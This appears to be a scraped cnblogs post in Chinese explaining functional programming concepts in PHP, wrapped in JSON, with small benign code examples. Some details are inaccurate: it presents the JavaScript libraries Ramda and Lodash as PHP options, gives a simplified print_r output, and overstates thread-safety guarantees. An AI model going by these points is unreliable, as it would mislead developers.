      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/catchadmin/p/19497758\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 08:26\">\n    <span>2026 年 PHP 函数式编程 优势与实际应用</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"2026-年-php-函数式编程-优势与实际应用\">2026 年 PHP 函数式编程 优势与实际应用</h1>\n<p>函数式编程（FP）已经存在几十年了，但近年来在实际开发中用得越来越多。这篇文章整理一下 FP 的核心概念和实际应用场景。</p>\n<h2 id=\"什么是函数式编程\">什么是函数式编程</h2>\n<p>在深入优势和应用之前，先快速回顾一下函数式编程是什么。</p>\n<p>函数式编程的核心是把计算当作数学函数的求值。它是一种声明式编程风格，描述的是\"要什么\"，而不是\"怎么做\"。在 FP 中，函数是一等公民，可以作为参数传递给其他函数，可以从函数返回，也可以赋值给变量。</p>\n<p>FP 的一个核心原则是不可变性——一旦给变量赋值，就不能再改变。这消除了副作用，让代码更可预测、更容易调试。另一个基本概念是纯函数，对于相同的输入总是产生相同的输出，不会修改任何外部状态。</p>\n<p><a href=\"https://catchadmin.com/post/2026-01/functional-programming-paradigms-2026\" rel=\"noopener nofollow\" target=\"_blank\">原文 2026 年 PHP 函数式编程 优势与实际应用</a></p>\n<h2 id=\"为什么开发者应该关注函数式编程\">为什么开发者应该关注函数式编程</h2>\n<h3 id=\"更简洁更易维护的代码\">更简洁、更易维护的代码</h3>\n<p>函数式编程鼓励编写模块化、易于理解的代码。因为函数是纯的（不修改状态），意外行为的空间更小，代码库更干净。这让调试、测试和后续修改都更容易。</p>\n<p>假设你在做一个 PHP 项目。使用函数式技术可以减少副作用，确保应用逻辑被隔离成更小的、可复用的代码片段。这也让后续更新或重构更容易，因为函数式代码的依赖通常更少。</p>\n<h3 id=\"并发和并行\">并发和并行</h3>\n<p>现代软件的一个挑战是处理并发和并行。随着多核处理器和分布式系统的普及，编写能高效处理多任务的代码比以往更重要。</p>\n<p>函数式编程在这方面有明显优势：因为函数避免修改共享状态，它们天生是线程安全的。这让编写并发应用更容易，不用担心竞态条件或死锁。</p>\n<p>比如一个需要处理大数据集的 PHP 应用。使用不可变数据结构和并行处理技术，可以确保应用的不同部分并发运行而不互相干扰。</p>\n<h3 id=\"更好的抽象和复用\">更好的抽象和复用</h3>\n<p>函数式编程促进高层抽象的创建。函数可以轻松组合、传递，在应用的不同部分复用。</p>\n<p>比如在 PHP 中，与其写重复的代码处理某些操作，不如写小的纯函数，然后灵活地组合起来。这减少了代码重复，更好地遵循 DRY（Don't Repeat Yourself）原则。</p>\n<h3 id=\"php-中的函数式工具\">PHP 中的函数式工具</h3>\n<p>PHP 不是纯函数式语言，但内置的 <code>array_map()</code>、<code>array_filter()</code>、<code>array_reduce()</code> 等函数提供了基本的函数式操作能力。第三方库如 Ramda、Lodash 也可以用。</p>\n<h2 id=\"函数式编程的核心原则\">函数式编程的核心原则</h2>\n<p>下面探讨函数式编程的一些核心原则，以及它们在实际编程中的应用。</p>\n<h3 id=\"不可变性\">不可变性</h3>\n<p>在函数式编程中，数据是不可变的。一旦设置了值，就不能改变。这个概念减少了与可变状态变化相关的 bug，简化了对程序行为的理解。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function addItemToList($list, $item) {\n    // 创建一个包含新元素的新列表\n    return array_merge($list, [$item]);\n}\n\n$list = [1, 2, 3];\n$newList = addItemToList($list, 4);\n\nprint_r($list);     // 输出: [1, 2, 3]（原列表不变）\nprint_r($newList);  // 输出: [1, 2, 3, 4]（包含新元素的新列表）\n</code></pre>\n<p>这个例子中，原始的 <code>$list</code> 保持不变，因为 PHP 数组是按值传递的。这展示了不可变性——原始数据结构被保留，返回的是包含新元素的新结构。</p>\n<h3 id=\"纯函数\">纯函数</h3>\n<p>纯函数对于相同的输入总是产生相同的输出，不会产生任何副作用。这让纯函数可预测且易于测试。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function square($number) {\n    return $number * $number;\n}\n\necho square(4); // 输出: 16\n</code></pre>\n<p><code>square()</code> 函数是纯的，因为对于相同的输入（4）总是产生相同的输出（16），而且不修改任何外部状态。</p>\n<h3 id=\"高阶函数\">高阶函数</h3>\n<p>高阶函数是可以接受其他函数作为参数或返回函数的函数。这实现了强大的抽象和代码复用。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function applyFunction($func, $value) {\n    return $func($value);\n}\n\nfunction double($x) {\n    return $x * 2;\n}\n\necho applyFunction('double', 5); // 输出: 10\n</code></pre>\n<p>这个例子中，<code>applyFunction()</code> 是一个高阶函数，因为它接受另一个函数（<code>double()</code>）作为参数并应用到一个值上。</p>\n<h3 id=\"函数组合\">函数组合</h3>\n<p>函数组合是把简单函数组合成更复杂函数的过程。这让你可以从更小的、可复用的组件构建复杂行为。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">function add($x, $y) {\n    return $x + $y;\n}\n\nfunction multiply($x, $y) {\n    return $x * $y;\n}\n\nfunction addThenMultiply($x, $y, $z) {\n    return multiply(add($x, $y), $z);\n}\n\necho addThenMultiply(2, 3, 4); // 输出: 20（add(2, 3) = 5, multiply(5, 4) = 20）\n</code></pre>\n<p>这里，<code>addThenMultiply()</code> 函数展示了如何把更小的函数组合起来创建新功能。这鼓励代码复用和模块化。</p>\n<h2 id=\"函数式编程的实际应用\">函数式编程的实际应用</h2>\n<p>函数式编程不只是理论概念——它正在实际应用中使用。下面看看函数式编程在不同领域的一些实际例子。</p>\n<h3 id=\"数据转换和-etl-流程\">数据转换和 ETL 流程</h3>\n<p>在数据密集型应用中，比如数据转换或 ETL（Extract, Transform, Load）流程，函数式编程表现出色。它让开发者可以不可变地操作大数据集，使用高层抽象进行转换。</p>\n<p>PHP 示例：</p>\n<pre><code class=\"language-php\">$data = [1, 2, 3, 4, 5];\n\n// 使用函数式方法处理数据\n$result = array_map(fn($x) =&gt; $x * 2, $data);  // 每个值翻倍\n$result = array_filter($result, fn($x) =&gt; $x &gt; 5); // 只保留大于 5 的值\n\nprint_r($result);  // 输出: [6, 8, 10]\n</code></pre>\n<p>这个例子中，我们使用 <code>array_map()</code> 和 <code>array_filter()</code> 不可变地转换和过滤数据集，这是函数式编程中的常见模式。</p>\n<h3 id=\"分布式系统中的并发\">分布式系统中的并发</h3>\n<p>函数式编程对不可变性和纯函数的强调，使它成为并发和并行处理任务的理想选择。你可以放心地编写并发应用，不用担心竞态条件。</p>\n<p>比如，在 PHP 中构建一个并发处理用户请求的分布式系统时，可以确保数据完整性，而不会引入与可变共享状态相关的 bug。</p>\n<h3 id=\"构建-api-端点和微服务\">构建 API 端点和微服务</h3>\n<p>构建微服务或 API 时，函数式编程可以帮助创建简洁、易维护的端点。通过确保每个函数处理特定任务且是纯的、确定性的，可以让每个微服务更容易测试和扩展。</p>\n<h2 id=\"小结\">小结</h2>\n<p>函数式编程的核心是不可变性、纯函数和高阶函数。这些概念在并发处理、数据转换等场景下比较实用。PHP 虽然不是纯函数式语言，但内置函数和第三方库已经提供了足够的支持。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 08:26</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\n阅读(<span id=\"post_view_count\">51</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}